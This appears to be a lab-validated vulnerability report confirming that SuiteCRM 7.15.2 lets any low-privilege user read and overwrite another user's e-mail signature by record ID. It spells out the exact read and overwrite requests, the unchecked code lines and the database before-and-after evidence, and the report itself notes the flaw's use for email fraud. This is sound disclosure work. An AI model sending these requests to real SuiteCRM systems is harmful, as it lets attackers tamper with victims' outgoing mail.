# VULN-033 — Users signatures: read + overwrite any user's e-mail signature (IDOR)

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: Medium
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28T20:37Z

## Preconditions
- Admin creates victim **V** and attacker **A** (fresh, unrelated low-priv users).
- As **V**: `module=Users&action=SaveSignature` with no `record` and `the_user_id=<V's id>` — mirrors how the real EditView's hidden field seeds a brand-new signature for yourself (`SaveSignature.php:44-51`: empty `record` → `$us->id = create_guid(); $us->new_with_id = true;`, then `if (empty($us->user_id) && isset($_REQUEST['the_user_id'])) { $us->user_id = $_REQUEST['the_user_id']; }`). The new signature's GUID is recovered from the `refresh_signature_list("<guid>","<name>")` JS snippet the script echoes back into the (classic-view-wrapped) response.

Note: `module=Users&action=SaveSignature`/`PopupSignature` are legacy flat files with no `modules/Users/views/view.*.php` counterpart, so `SugarController::callLegacyCode()` routes them through the "classic module" fallback — the script's own echoed output (a `<script>refreshTemplates(){...}</script>` snippet, or the `insert_popup_header/footer`-wrapped signature body) ends up embedded inside a full themed page rather than being the entire response. The exploit greps for the relevant markers rather than assuming a bare/minimal response.

## Request
See `request.http` (both requests). Summary:
```
# READ
GET /index.php?module=Users&action=PopupSignature&record=<victim_signature_id>
Cookie: PHPSESSID=<attacker session>

# OVERWRITE
POST /index.php?module=Users&action=SaveSignature
Cookie: PHPSESSID=<attacker session>
Content-Type: application/x-www-form-urlencoded

record=<victim_signature_id>&name=pwned-by-attacker&description=<p>PWNEDSIG033_...</p>
```

## Response
See `response.txt`. READ: attacker's response (buried inside the classic-view page, ~103 KB) contains the victim's signature body marker verbatim. OVERWRITE: 200 OK; DB verification below is the decisive evidence.

## Observation
Matches the static finding precisely, and the DB proof is unambiguous — **same row id**, `user_id` **unchanged** (still the victim's), but `name`/`signature_html` now carry the attacker's content:

```
-- BEFORE (created by victim) --
id                                    user_id                               name           signature_html                          deleted
43701af9-567d-41b2-849c-17be3e5921c2  55648dba-c00b-481b-925d-6851e5af2bbb  V033Sig_b253f51c  <p>SECRETSIG033_776551b3</p>          0

-- AFTER (overwritten by attacker) --
id                                    user_id                               name              signature_html                        deleted
43701af9-567d-41b2-849c-17be3e5921c2  55648dba-c00b-481b-925d-6851e5af2bbb  pwned-by-attacker <p>PWNEDSIG033_a18e9d4e</p>            0
```
`PopupSignature.php:56-59` and `SaveSignature.php:44-46` both `retrieve($_REQUEST['record'])` with no comparison of the loaded `user_id` against `current_user->id` anywhere in either file — exactly as documented.

## Side effects
- One `users_signatures` row created by V, then overwritten (not deleted) by A. Verified via:
  `docker compose -p cvehunterlab_suitecrm exec -T db mysql -uroot -pSuiteRoot!2026x suitecrm -e "SELECT id,user_id,name,signature_html,deleted FROM users_signatures WHERE id='<id>';"`
  — see `evidence/db_before_after.txt` for the full before/after dump.
- Two new low-priv Users created (random-suffixed, harmless).

## Research & references
- CWE-639 — Authorization Bypass Through User-Controlled Key.
- This is a variant of a broader "BEC via trusted-channel content injection" pattern: OWASP's guidance on business email compromise notes forged/altered signature blocks as a common social-engineering vector once an attacker can write to a victim's outgoing-mail template.

## If FAILED
N/A — CONFIRMED.
